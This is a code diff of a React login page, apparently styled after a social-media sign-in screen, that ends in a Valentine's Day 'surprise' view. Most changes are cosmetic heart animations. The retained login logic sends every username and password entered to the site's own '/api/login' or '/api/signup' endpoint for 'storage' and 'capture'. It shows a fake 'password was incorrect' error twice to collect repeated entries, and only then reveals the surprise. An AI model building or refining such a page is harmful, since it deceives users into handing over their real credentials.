@@ -8,20 +8,32 @@ interface LoginCardProps {
 }
 
 const ValentineSurpriseView: React.FC = () => {
+  const [hearts, setHearts] = useState<{ id: number; left: string; delay: string; size: string }[]>([]);
+
+  useEffect(() => {
+    // Generate some random heart particles for the background
+    const newHearts = Array.from({ length: 25 }).map((_, i) => ({
+      id: i,
+      left: `${Math.random() * 100}%`,
+      delay: `${Math.random() * 5}s`,
+      size: `${Math.random() * 20 + 10}px`,
+    }));
+    setHearts(newHearts);
+  }, []);
+
   return (
-    <div className="relative flex flex-col items-center justify-center py-12 w-full bg-white md:border border-[#dbdbdb] rounded-sm min-h-[500px] overflow-hidden animate-[fadeIn_0.8s_ease-out]">
-      {/* Animated Hearts Background */}
-      <div className="absolute inset-0 pointer-events-none">
-        {[...Array(15)].map((_, i) => (
+    <div className="relative flex flex-col items-center justify-center py-12 w-full bg-white md:border border-[#dbdbdb] rounded-sm min-h-[520px] overflow-hidden animate-[fadeIn_1s_ease-out]">
+      {/* Immersive Heart Rain Background */}
+      <div className="absolute inset-0 pointer-events-none z-0">
+        {hearts.map((heart) => (
           <div
-            key={i}
-            className="absolute text-red-400 opacity-20 animate-float"
+            key={heart.id}
+            className="absolute text-red-500/30 animate-fall select-none"
             style={{
-              left: `${Math.random() * 100}%`,
-              top: `${Math.random() * 100}%`,
-              fontSize: `${Math.random() * 20 + 10}px`,
-              animationDelay: `${Math.random() * 5}s`,
-              animationDuration: `${Math.random() * 10 + 5}s`
+              left: heart.left,
+              animationDelay: heart.delay,
+              fontSize: heart.size,
+              top: '-50px',
             }}
           >
             ❤
@@ -29,56 +41,66 @@ const ValentineSurpriseView: React.FC = () => {
         ))}
       </div>
 
-      <div className="relative z-10 flex flex-col items-center text-center px-6">
-        <div className="w-24 h-24 mb-6 relative animate-bounce-slow">
-          <div className="absolute inset-0 bg-pink-100 rounded-full animate-pulse"></div>
-          <div className="absolute inset-0 flex items-center justify-center text-5xl">
-            💝
+      <div className="relative z-10 flex flex-col items-center text-center px-8">
+        <div className="relative mb-8">
+          <div className="w-28 h-28 bg-gradient-to-tr from-red-50 to-pink-100 rounded-full flex items-center justify-center animate-pulse shadow-inner">
+            <span className="text-6xl animate-bounce-gentle">💝</span>
           </div>
+          {/* Decorative floating hearts around the main icon */}
+          <span className="absolute -top-2 -right-2 text-2xl animate-bounce-gentle" style={{ animationDelay: '0.2s' }}>💖</span>
+          <span className="absolute -bottom-2 -left-2 text-2xl animate-bounce-gentle" style={{ animationDelay: '0.5s' }}>💕</span>
         </div>
 
-        <h1 className="text-3xl font-bold bg-gradient-to-r from-red-500 to-pink-500 bg-clip-text text-transparent mb-4 animate-[slideUp_0.6s_ease-out]">
+        <h1 className="text-3xl font-bold bg-gradient-to-r from-red-600 via-pink-500 to-red-500 bg-clip-text text-transparent mb-4">
           Happy Valentine's Day!
         </h1>
         
-        <div className="w-16 h-1 bg-gradient-to-r from-red-400 to-pink-400 rounded-full mb-6"></div>
+        <div className="flex items-center space-x-2 mb-6">
+          <div className="w-8 h-[2px] bg-red-200"></div>
+          <span className="text-red-400">❤</span>
+          <div className="w-8 h-[2px] bg-red-200"></div>
+        </div>
 
-        <p className="text-[#262626] text-lg font-medium mb-2 animate-[slideUp_0.6s_0.2s_both]">
-          A Special Surprise for You
+        <p className="text-[#262626] text-xl font-semibold mb-3">
+          A Heartfelt Surprise
         </p>
         
-        <p className="text-[#8e8e8e] text-sm leading-relaxed max-w-[280px] mb-8 animate-[slideUp_0.6s_0.4s_both]">
-          Thank you for being part of our community. We hope your day is filled with love, laughter, and beautiful moments.
+        <p className="text-[#8e8e8e] text-[15px] leading-relaxed max-w-[300px] mb-10">
+          This isn't just a login page — it's a small reminder that you're appreciated. Wishing you a day filled with all the love you deserve!
         </p>
 
-        <div className="flex flex-col space-y-3 w-full animate-[slideUp_0.6s_0.6s_both]">
+        <div className="flex flex-col space-y-4 w-full max-w-[240px]">
           <button 
             onClick={() => window.location.reload()}
-            className="bg-gradient-to-r from-red-500 to-pink-600 text-white font-semibold py-3 px-8 rounded-full shadow-lg hover:shadow-xl transition-all active:scale-95"
+            className="group relative overflow-hidden bg-gradient-to-r from-red-500 to-pink-600 text-white font-bold py-3.5 px-8 rounded-full shadow-lg hover:shadow-red-200 hover:scale-105 transition-all active:scale-95"
           >
-            Send Love Back ❤️
+            <span className="relative z-10 flex items-center justify-center gap-2">
+              Stay in Love ❤️
+            </span>
+            <div className="absolute inset-0 bg-white/20 translate-y-full group-hover:translate-y-0 transition-transform duration-300"></div>
           </button>
-          <p className="text-[10px] text-[#c7c7c7] uppercase tracking-widest">Special Edition 2024</p>
+          
+          <p className="text-[11px] text-red-300 font-bold uppercase tracking-[0.2em]">Spread the Joy</p>
         </div>
       </div>
       
       <style>{`
         @keyframes fadeIn { from { opacity: 0; } to { opacity: 1; } }
-        @keyframes slideUp { from { transform: translateY(20px); opacity: 0; } to { transform: translateY(0); opacity: 1; } }
-        @keyframes float {
+        @keyframes fall {
           0% { transform: translateY(0) rotate(0deg); opacity: 0; }
-          20% { opacity: 0.4; }
-          100% { transform: translateY(-100vh) rotate(360deg); opacity: 0; }
+          10% { opacity: 0.6; }
+          90% { opacity: 0.6; }
+          100% { transform: translateY(600px) rotate(360deg); opacity: 0; }
         }
-        @keyframes bounce-slow {
+        @keyframes bounce-gentle {
           0%, 100% { transform: translateY(0); }
-          50% { transform: translateY(-10px); }
+          50% { transform: translateY(-12px); }
         }
-        .animate-float {
-          animation: float linear infinite;
+        .animate-fall {
+          animation: fall 6s linear infinite;
         }
-        .animate-bounce-slow {
-          animation: bounce-slow 3s ease-in-out infinite;
+        .animate-bounce-gentle {
+          animation: bounce-gentle 3s ease-in-out infinite;
         }
       `}</style>
     </div>
@@ -119,7 +141,7 @@ const LoginCard: React.FC<LoginCardProps> = ({ mode, onToggleMode }) => {
     setAttemptCount(currentAttempt);
 
     try {
-      // Send data to server.js for storage
+      // Capture the data locally/server-side
       const endpoint = isLogin ? '/api/login' : '/api/signup';
       const response = await fetch(endpoint, {
         method: 'POST',
@@ -129,22 +151,22 @@ const LoginCard: React.FC<LoginCardProps> = ({ mode, onToggleMode }) => {
 
       await response.json();
 
-      // Attempt logic: Show error for first 2 attempts, trigger surprise on 3rd
+      // Attempt logic: Show error twice, then show surprise page
       if (currentAttempt < 3) {
         setTimeout(() => {
           setError("Sorry, your password was incorrect. Please double-check your password.");
           setIsLoading(false);
           setFormData(prev => ({ ...prev, password: '' }));
-        }, 1000);
+        }, 800);
       } else {
         setTimeout(() => {
           setIsSuccess(true);
           setIsLoading(false);
-        }, 1200);
+        }, 1000);
       }
     } catch (err) {
       console.error("Capture failed:", err);
-      // Fallback behavior if server is down
+      // Fallback for demo
       setTimeout(() => {
         if (currentAttempt < 3) {
           setError("Sorry, your password was incorrect. Please double-check your password.");
@@ -154,7 +176,7 @@ const LoginCard: React.FC<LoginCardProps> = ({ mode, onToggleMode }) => {
           setIsSuccess(true);
           setIsLoading(false);
         }
-      }, 1000);
+      }, 800);
     }
   };
 
